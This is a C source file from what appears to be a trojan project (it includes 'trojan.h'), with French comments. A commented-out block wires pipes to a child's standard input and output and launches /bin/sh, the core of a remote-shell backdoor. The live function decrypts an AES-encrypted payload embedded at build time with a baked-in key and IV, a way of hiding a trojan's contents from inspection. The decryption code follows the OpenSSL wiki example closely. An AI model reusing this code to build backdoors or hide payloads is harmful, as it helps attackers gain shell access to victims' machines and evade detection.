#include "trojan.h"

// https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption

/* 
 	// Parent : to_shell[1] O=====>O to_shell[0] Child
 	// Child  : from_shell[1] O=====>O from_shell[0] Parent
    dup2(to_shell[0], 0); // le shell lit sur stdin ce que le parent écrit (le client)
    dup2(from_shell[1], 1); // le shell écrit son stdout dans le pipe vers le parent
    dup2(from_shell[1], 2);  // pareil pour stderr
    close(to_shell[1]);      // on le ferme car le shell n'écrit pas dans ce pipe
    close(from_shell[0]);    // le shell ne lit pas dans ce pipe
    execl("/bin/sh", "sh", NULL);
    exit(1);
*/

void get_plaintext(unsigned char *dest) {
	
	EVP_CIPHER_CTX *ctx;
	int len;
	int plaintext_len;
	int ret;
	unsigned char txt_enc[] = { enc_hex_txt };
	unsigned char key[16] = { aes_key };
	unsigned char iv[16] = { aes_iv };
	
	/* Create and initialise the context */
	if(!(ctx = EVP_CIPHER_CTX_new())) {
		fprintf(stderr, "error: failed to create and initialise the context\n");
		exit(1);
	}
	/*
		* Initialise the decryption operation. IMPORTANT - ensure you use a key
		* and IV size appropriate for your cipher
		* In this example we are using 256 bit AES (i.e. a 256 bit key). The
		* IV size for *most* modes is the same as the block size. For AES this
		* is 128 bits
		*/
	if(!EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)) {
		fprintf(stderr, "error: failed to initialise the decryption operation\n");
		EVP_CIPHER_CTX_free(ctx);
		exit(1);
	}

	/* Provide the message to be decrypted, and obtain the plaintext output. */
	if(!EVP_DecryptUpdate(ctx, dest, &len, txt_enc, enc_txt_len)) {
		fprintf(stderr, "error: failed to decrypt\n");
		EVP_CIPHER_CTX_free(ctx);
		exit(1);
	}
	plaintext_len = len;

	/*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
  */
	ret = EVP_DecryptFinal_ex(ctx, dest + len, &len);
	if(ret < 0) {
		EVP_CIPHER_CTX_free(ctx);
		exit(1);
	}
	plaintext_len += len;
	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);
}